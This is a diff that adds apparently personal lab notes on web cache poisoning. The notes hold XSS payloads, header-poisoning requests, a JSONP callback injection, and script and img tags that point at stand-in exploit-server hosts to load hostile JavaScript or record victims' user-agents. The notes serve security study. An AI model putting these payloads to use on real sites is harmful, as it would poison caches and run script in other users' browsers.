@@ -1,0 +1,61 @@
+Theory
+> X-Cache: hit -> came from the cache
+> cache buster example -> ?cj=1234
+
+Poisoing X-Forwarded-Host/Unkeyed headers:
+> X-Forwarded-Host: your-domain.com
+> It may get reflected:
+    <script type="text/javascript" src="//exploit-0af1006503fa7a8cc89e0243019500c3.exploit-server.ne/resources/js/tracking.js"></script>
+> Host malicious file under /resources/js/tracking.js
+
+Poisoning cookies:
+fehost=prod-cache-011"-alert(1)-"something
+
+Poisoning Scheme:
+GET /resources/js/tracking.js 
+...
+X-Forwarded-Scheme: nohttp
+X-Forwarded-Host: exploit-0ac000c104f72098c3c547f501750044.exploit-server.net
+
+Overview:
+1. Parammienr -> guess headers
+2. Find unlinked Param
+3. Test param and see that it gets reflected in response -> xss
+4. See response and find that vary is used on user agent
+5. Find users user-agent by posting a comment linking to exploit server:
+<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
+6. See logs
+ 
+ 
+Get User-agent or other:
+<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
+ 
+Query Paramters do not get cached:
+GET /?evil='/><script>alert(1)</script>
+ 
+Guess GET parameters
+GET /?utm_content='/><script>alert(1)</script>
+Use Param Miner's "Guess GET parameters" 
+ 
+> /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
+ 
+Get FAT:
+GET /js/geolocate.js?callback=setCountryCookie
+…
+callback=arbitraryFunction
+ 
+URL Normalization:
+/<script>alert(1)</script>
+ 
+ 
+QUESTIONS
+What is a cache oracle? How do I identify one?
+How do I know when something has been cached? 
+How does the server know when to cache something or not?
+ 
+How do I know when something has been cached?
+The reponse may contain an Age header which indicates how old the response is in seconds. 
+The response may also contain the Cache-Control header, for example, Cache-Control: max-age=35 
+This means the reponse cached response will expire in 35 seconds. At this point, you'll need 
+to make a new request, and the new response will be cached. You can simply determine if 
+the response recived was cached by inspecting the X-Cache header. Miss = not cached, Hit = cached
